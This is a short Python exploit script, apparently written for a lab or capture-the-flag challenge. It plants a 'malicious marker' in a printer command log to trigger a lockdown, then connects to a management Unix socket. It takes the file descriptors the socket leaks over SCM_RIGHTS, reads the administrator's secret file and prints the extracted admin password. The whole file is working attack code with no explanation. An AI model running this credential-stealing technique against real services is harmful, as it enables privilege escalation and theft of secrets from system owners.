import socket, array, struct, os

sock_path = "/run/paperwork/mgmt.sock"

# First write malicious marker to trigger lockdown
with open("/home/archivist/printer/logs/commands.log", "w") as f:
    f.write("FSQUERY\n")

# Connect
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(sock_path)

# Receive response (with SCM_RIGHTS)
msg, ancdata, _, _ = s.recvmsg(1024, socket.CMSG_LEN(8))  # get 1 int (fd)

# Parse SCM_RIGHTS
for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        # unpack array of ints from bytes
        fds = struct.unpack("i" * (len(cmsg_data) // 4), cmsg_data)
        log_fd = fds[0]
        admin_fd = fds[1]  # This is the magic one!

        print(f"Received FDs: log={log_fd}, admin={admin_fd}")

        # Read from admin fd
        os.lseek(admin_fd, 0, os.SEEK_SET)
        secret_data = os.read(admin_fd, 1024).decode().strip()
        print(f"Admin secret content: {secret_data}")

        # Extract password:
        for line in secret_data.split('\n'):
            if 'ADMIN_PASSWORD=' in line:
                password = line.split('=',1)[1].split()[0]
                print(f"Admin password: {password}")
        break

s.close()
